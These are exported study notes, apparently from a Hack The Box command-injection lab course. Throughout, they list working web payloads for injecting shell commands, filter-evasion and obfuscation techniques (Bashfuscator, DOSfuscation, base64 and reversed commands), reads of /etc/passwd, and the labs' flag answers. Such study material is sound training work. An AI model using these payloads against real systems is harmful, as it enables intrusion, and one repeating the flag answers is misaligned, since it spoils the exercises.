---
tags: [CWES, XMind, output, xmind-output]
source_file: CWES.xmind
source_sheet: "1"
module: "Command Injection"
output_topics: 38
---

# Command Injection — XMind Outputs

> [!info] Yellow XMind topic semantics
> The author uses yellow topics to represent **outputs**. Every entry below corresponds to one yellow source topic and retains its XMind topic ID in a hidden validation marker.

## Outputs

> [!output]+ 🟨 Output 001
> 64 bytes from ...
>
> www-data
>
> **Source path:** Command Injection → Exploitation → Injecting Command → Host Checker → Bypassing Front-End Validation → web proxy that can intercept the HTTP requests → in Burp in POST parameter → Connection: close  ip=127.0.0.1%3b+whoami → 64 bytes from ...  www-data
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e7e15e17-9339-4340-8033-9a1b6436b5cf -->

> [!output]+ 🟨 Output 002
> www-data
>
> **Source path:** Command Injection → Exploitation → Injecting Command → Other Injection Operators → LAB → Which of them only shows the output of the injected command? → ip=127.0.0.1+|+whoami → www-data
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 58565578-ed7c-4154-91f3-6b0b39f62bb5 -->

> [!output]+ 🟨 Output 003
> Invalid Input
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Bypass Blacklisted Operators → 127.0.0.1%0a whoami → Invalid Input
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e1c4d59c-aac7-4142-a521-0d62a87928aa -->

> [!output]+ 🟨 Output 004
> Invalid Input
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Bypass Blacklisted Operators → ip=127.0.0.1%0a+ → Invalid Input
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 69af4103-0a5e-4f8e-a74a-c7f33d41180c -->

> [!output]+ 🟨 Output 005
> /usr/local/bin:/usr/bin:/bin:/usr/games
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Bypass Blacklisted Operators → Linux → get blacklist using environment → / → echo ${PATH} → /usr/local/bin:/usr/bin:/bin:/usr/games
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 60be99f1-5c77-49cd-b4dd-af779de24334 -->

> [!output]+ 🟨 Output 006
> /
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Bypass Blacklisted Operators → Linux → get blacklist using environment → / → echo ${PATH} → /usr/local/bin:/usr/bin:/bin:/usr/games → So, if we start at the 0 character, and only take a string of length 1, we will end up with only the / → echo ${PATH:0:1} → /
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: fe6ace17-a297-40bc-8750-5a578761aaca -->

> [!output]+ 🟨 Output 007
> ;
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Bypass Blacklisted Operators → Linux → get blacklist using environment → ; → echo ${LS_COLORS:10:1} → ;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e38a0c5e-e780-46a6-8e09-a096aae7a807 -->

> [!output]+ 🟨 Output 008
> \\
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Bypass Blacklisted Operators → Windows → %HOMEPATH% -&gt; \\Users\\htb-student → powershell → $env:HOMEPATH[0] → \\
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a7ff6c75-62ed-4714-903b-aba05d5d75f8 -->

> [!output]+ 🟨 Output 009
> # \\ is on 92, before it is [ on 91
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Bypass Blacklisted Operators → Character Shifting → in Linux → shifts the character we pass by 1. So, all we have to do is find the character in the ASCII table that is just before → man ascii → # \\ is on 92, before it is [ on 91
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 1f7b318d-df14-4ccc-8549-9054362b5221 -->

> [!output]+ 🟨 Output 010
> \\
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Bypass Blacklisted Operators → Character Shifting → in Linux → shifts the character we pass by 1. So, all we have to do is find the character in the ASCII table that is just before → man ascii → # \\ is on 92, before it is [ on 91 → $ echo $(tr '!-}' '"-~'&lt;&lt;&lt;[) → \\
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 88f3a22c-4882-4b58-b548-4b8f0d249c85 -->

> [!output]+ 🟨 Output 011
> / = ${PATH:0:1}
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Bypass Blacklisted Operators → LAB2 (updated) → Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found. → identify success payload → replace / → / = ${PATH:0:1}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: f1bc424b-7573-4135-9e3b-4d58b449e6e4 -->

> [!output]+ 🟨 Output 012
> cat /home/rayanmewa/flag.txt
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Bypass Blacklisted Operators → LAB2 (updated) → Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found. → use crafted payload (test in bash) → echo {cat,${PATH:0:1}home${PATH:0:1}rayanmewa${PATH:0:1}flag.txt} → cat /home/rayanmewa/flag.txt
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2cd3205f-2af0-488f-9a3d-64e54e796bff -->

> [!output]+ 🟨 Output 013
> 1nj3c70r
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Bypass Blacklisted Operators → LAB2 (updated) → Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found. → send in burp → identify username in /home → ip=127.0.0.1%0a{cat,${PATH:0:1}home} → 1nj3c70r
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 893fa030-df85-4bc2-8ca1-e8636817442a -->

> [!output]+ 🟨 Output 014
> Invalid Command
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Bypass Blacklisted Operators → LAB2 (updated) → Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found. → send in burp → specify the full path → ip=127.0.0.1%0a{cat,${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt} → Invalid Command
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 66fc6025-4336-4dc4-aec4-549f866c9163 -->

> [!output]+ 🟨 Output 015
> HTB{b451c_f1l73r5_w0n7_570p_m3}
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Bypass Blacklisted Operators → LAB2 (updated) → Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found. → send in burp → modify the command cat → ip=127.0.0.1%0a{ca't',${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt} → HTB{b451c_f1l73r5_w0n7_570p_m3}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 4f52756f-a4bc-4f73-9d11-9b63bff6ab3b -->

> [!output]+ 🟨 Output 016
> 21y4d
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Advanced Command Obfuscation → Case Manipulation → (e.g. WHOAMI) or alternating between cases (e.g. WhOaMi) → in powershell - Windows → PS C:\htb&gt; → WhOaMi → 21y4d
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 1793e692-8382-4a11-b746-4bd5f4ca7a77 -->

> [!output]+ 🟨 Output 017
> 21y4d
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Advanced Command Obfuscation → Case Manipulation → (e.g. WHOAMI) or alternating between cases (e.g. WhOaMi) → in bash - Linux → we have to get a bit creative and find a command that turns the command into an all-lowercase word → execute → one example → $(tr "[A-Z]" "[a-z]"&lt;&lt;&lt;"WhOaMi") → 21y4d
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 26550056-a033-4ca0-bf17-9d82410e646d -->

> [!output]+ 🟨 Output 018
> imaohw
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Advanced Command Obfuscation → Reversed Commands → Linux → echo 'whoami' | rev → imaohw
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: f56f820a-f519-46bc-ba34-03057f450494 -->

> [!output]+ 🟨 Output 019
> 21y4d
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Advanced Command Obfuscation → Reversed Commands → Linux → execute the original command by reversing it back in a sub-shell ($()) → $(rev&lt;&lt;&lt;'imaohw') → 21y4d
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 9b861eb1-47f4-44eb-8319-554ab706579a -->

> [!output]+ 🟨 Output 020
> 21y4d
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Advanced Command Obfuscation → Reversed Commands → Linux → execute the original command by reversing it back in a sub-shell ($()) → if pipe | used you have to use eval → eval "$(rev&lt;&lt;&lt;'imaohw')" | tail -n 1 → 21y4d
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: f4eaf673-a350-4b03-bf7e-9b866065a9b7 -->

> [!output]+ 🟨 Output 021
> imaohw
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Advanced Command Obfuscation → Reversed Commands → Windows → "whoami"[-1..-20] -join '' → imaohw
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ef2db591-897f-49a0-b2f8-7b60fac1caf1 -->

> [!output]+ 🟨 Output 022
> 21y4d
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Advanced Command Obfuscation → Reversed Commands → Windows → "whoami"[-1..-20] -join '' → imaohw → execute a reversed string with a PowerShell sub-shell (iex "$()") → iex "$('imaohw'[-1..-20] -join '')" → 21y4d
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 77135053-1021-49b1-89b0-516bb8f8f5a2 -->

> [!output]+ 🟨 Output 023
> Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Advanced Command Obfuscation → Encoded Commands → base64 → Linux → echo -n 'cat /etc/passwd | grep 33' | base64 → Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d7bce30f-21ae-4e8e-aa35-d3d313b3d32a -->

> [!output]+ 🟨 Output 024
> www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Advanced Command Obfuscation → Encoded Commands → base64 → Linux → echo -n 'cat /etc/passwd | grep 33' | base64 → Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw== → execute → create a command that will decode the encoded string in a sub-shell ($()) → bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) → www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 58e92fc9-d3fa-4e8e-b8bb-b43e03f75c5b -->

> [!output]+ 🟨 Output 025
> dwBoAG8AYQBtAGkA
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Advanced Command Obfuscation → Encoded Commands → base64 → Linux → echo -n whoami | iconv -f utf-8 -t utf-16le | base64 → dwBoAG8AYQBtAGkA
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 89e6d2a9-4866-4658-a336-abfc41cba205 -->

> [!output]+ 🟨 Output 026
> dwBoAG8AYQBtAGkA
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Advanced Command Obfuscation → Encoded Commands → base64 → Windows → [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami')) → dwBoAG8AYQBtAGkA
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7c4bd16c-eabd-4dd8-bc95-e70a0641fe90 -->

> [!output]+ 🟨 Output 027
> 21y4d
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Advanced Command Obfuscation → Encoded Commands → base64 → Windows → [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami')) → dwBoAG8AYQBtAGkA → decode the b64 string and execute it with a PowerShell sub-shell (iex "$()" → iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))" → 21y4d
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 21e9b54c-d410-44a4-beba-b68e48e3eca0 -->

> [!output]+ 🟨 Output 028
> ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Advanced Command Obfuscation → LAB → Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1 → use command find to get the file name → echo 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64 → ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 0fed8d19-eb38-44b5-a34b-dbbf58bc3d95 -->

> [!output]+ 🟨 Output 029
> /usr/share/mysql/debian_create_root_user.sql
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Advanced Command Obfuscation → LAB → Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1 → use command find to get the file name → echo 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64 → ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE= → bypass the space → sed 's/ /%09/g' payloads → execute it using → bash&lt;&lt;&lt;$(base64%09-d&lt;&lt;&lt;ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=) → in burp → ip=127.0.0.1%0abash%3c%3c%3c$(base64%09-d%3c%3c%3cZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE%3d) → /usr/share/mysql/debian_create_root_user.sql
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b349f0b6-704b-4bcf-b34b-84864359380d -->

> [!output]+ 🟨 Output 030
> [+] Mutators used: Token/ForCode -&gt; Command/Reverse
> [+] Payload:
>  ${*/+27\[X\(} ...SNIP...  ${*~}
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Evasion Tools → Linux (Bashfuscator) → ./bashfuscator -c 'cat /etc/passwd' → [+] Mutators used: Token/ForCode -&gt; Command/Reverse [+] Payload:  ${*/+27\[X\(} ...SNIP...  ${*~}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 25ff0549-e1bd-42e4-aacb-90a76f2bd14f -->

> [!output]+ 🟨 Output 031
> eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Evasion Tools → Linux (Bashfuscator) → ./bashfuscator -c 'cat /etc/passwd' → produce a shorter and simpler obfuscated command → ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1 → eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 89dec353-a1e3-476c-b4a7-2e342d1abb73 -->

> [!output]+ 🟨 Output 032
> root:x:0:0:root:/root:/bin/bash
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Evasion Tools → Linux (Bashfuscator) → ./bashfuscator -c 'cat /etc/passwd' → produce a shorter and simpler obfuscated command → ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1 → eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)" → bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"' → root:x:0:0:root:/root:/bin/bash
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: c706da65-fad0-44e2-b88b-f9cfe282fa99 -->

> [!output]+ 🟨 Output 033
> rayan
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Evasion Tools → Linux (Bashfuscator) → ./bashfuscator -c 'cat /etc/passwd' → produce a shorter and simpler obfuscated command → ./bashfuscator -c 'whoami' -s 1 -t 1 --no-mangling --layers 1 → printf %s "$(DO=(w i o m h a);for xp in 0 4 2 5 3 1;do printf %s "${DO[$xp]}";done;)"|bash → rayan
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ee7d1322-55e5-4aa1-b889-8cd47401bec8 -->

> [!output]+ 🟨 Output 034
> Invoke-DOSfuscation&gt;
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Evasion Tools → Windows (DOSfuscation) → Invoke-DOSfuscation → Invoke-DOSfuscation&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: bb4e5c65-2526-4377-a3d0-f9e631128f21 -->

> [!output]+ 🟨 Output 035
> [*] BINARY      Obfuscated binary syntax for cmd.exe &amp; powershell.exe
> [*] ENCODING    Environment variable encoding
> [*] PAYLOAD     Obfuscated payload via DOSfuscation
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Evasion Tools → Windows (DOSfuscation) → Invoke-DOSfuscation → Invoke-DOSfuscation&gt; → help → [*] BINARY      Obfuscated binary syntax for cmd.exe &amp; powershell.exe  [*] ENCODING    Environment variable encoding  [*] PAYLOAD     Obfuscated payload via DOSfuscation
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: c0a9c9a2-0544-4a14-b56f-67fef3a63d2f -->

> [!output]+ 🟨 Output 036
> Result:
> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Evasion Tools → Windows (DOSfuscation) → Invoke-DOSfuscation → Invoke-DOSfuscation&gt; → SET COMMAND type C:\Users\htb-student\Desktop\flag.txt → encoding → 1 → Result: typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: cb8b922b-7e46-44ff-b1b6-235cdd6103e2 -->

> [!output]+ 🟨 Output 037
> Result:
> wh%SystemRoot:~7,1%ami
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Evasion Tools → Windows (DOSfuscation) → Invoke-DOSfuscation → Invoke-DOSfuscation&gt; → SET COMMAND whoami → encoding → 1 → Result: wh%SystemRoot:~7,1%ami
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 93015f4f-4b9f-4b2f-ac49-385321b84701 -->

> [!output]+ 🟨 Output 038
> test_flag
>
> **Source path:** Command Injection → Filter Evasion → Identifying Filters → Bypassing Space Filters → Evasion Tools → Windows (DOSfuscation) → we can try running the obfuscated command on CMD → C:\htb&gt; typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt → test_flag
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 87d1a496-21d1-4403-b08c-050dd811b987 -->
